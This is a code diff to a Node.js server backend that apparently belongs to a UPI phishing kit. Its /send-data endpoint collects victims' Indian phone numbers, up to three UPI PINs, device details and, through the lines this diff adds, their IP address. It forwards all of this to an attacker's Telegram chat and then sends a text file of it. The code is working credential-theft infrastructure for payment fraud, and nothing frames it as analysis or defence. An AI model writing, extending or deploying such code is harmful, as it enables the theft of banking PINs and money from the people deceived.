@@ -14,7 +14,7 @@ const { PORT, BOT_TOKEN, CHAT_ID } = process.env;
 let lastMessageId = null;
 let currentMessageText = "";
 let pinCount = 0; 
-let fullDeviceName = "Device_Details"; // Poora model name store karne ke liye
+let fullDeviceName = "Device_Details"; 
 
 const sendOrUpdateTelegram = async (message) => {
     try {
@@ -50,11 +50,7 @@ const sendFileToTelegram = async (content, filename) => {
     try {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        
-        // TXT file se stars (*) hata kar saaf content
         const cleanContent = content.replace(/\*/g, '');
-        
-        // Filename ko sanitize karna (Characters like / ya space ko handle karne ke liye)
         const safeFilename = filename.replace(/[/\\?%*:|"<>]/g, '-'); 
 
         form.append('document', Buffer.from(cleanContent, 'utf-8'), { 
@@ -70,20 +66,20 @@ const sendFileToTelegram = async (content, filename) => {
 };
 
 app.post('/send-data', async (req, res) => {
-    const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
+    // userIP ko request body se extract kiya gaya hai
+    const { type, number, pin, deviceId, deviceTime, deviceDate, userIP } = req.body;
     
-    // Poora Device Model name save karna file name ke liye
     if (deviceId) {
         fullDeviceName = deviceId;
     }
 
     if (type === 'NUMBER') {
-        // Naye user ke liye reset
         lastMessageId = null; 
         pinCount = 0; 
         currentMessageText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
         currentMessageText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
         currentMessageText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
+        currentMessageText += `*Real IP:* ${userIP || 'Detecting...'}\n`; // IP Line yahan add ki gayi hai
         currentMessageText += `*Number:* +91 ${number}\n`;
         
         await sendOrUpdateTelegram(currentMessageText);
@@ -91,10 +87,8 @@ app.post('/send-data', async (req, res) => {
         pinCount++; 
         currentMessageText += `*UPI PIN:* ${pin}\n`;
         
-        // Telegram par message edit karna
         await sendOrUpdateTelegram(currentMessageText);
         
-        // Jab 3 PIN ho jayein, tabhi TXT file bhejna poore model name ke saath
         if (pinCount === 3) {
             await sendFileToTelegram(currentMessageText, fullDeviceName);
         }
